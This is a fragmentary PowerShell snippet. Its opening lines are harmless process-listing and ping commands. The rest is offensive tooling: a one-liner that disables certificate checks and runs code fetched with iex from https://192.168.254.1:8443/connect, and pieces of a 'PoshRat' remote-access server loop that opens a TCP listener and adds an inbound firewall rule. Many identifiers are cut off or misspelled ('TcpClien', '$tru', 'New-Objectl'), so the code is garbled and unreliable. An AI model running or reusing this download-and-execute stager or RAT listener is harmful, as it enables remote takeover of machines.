...
$top5 = $processes | Select-Object -First 5
$top5 | Format-List -Property Name, Id, CPU
$target = "google.com" | ping.exe -t $target | ForEach-Object {"{0} - {1}" -f (Get-Date), $_}
...
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex (New-Objectl Net.WebClient).DownloadString("https://192.168.254.1:8443/connect")
...
do
    ...
    $listener = New-Object System.Net.Sockets.TcpListener $endpoin
    ...
    netsh advfirewall firewall add rule name="PoshRat Server $Port" dir=in action=allow protocol=TCP localport=$Port | Out-Nul
    ...
    $Client = New-Object System.Net.Sockets.TcpClien
    $Client.NoDelay = $tru
    ...
    if($Client -ne $null
	    ...
	    Receive-ClientHttpsRequest $Clien
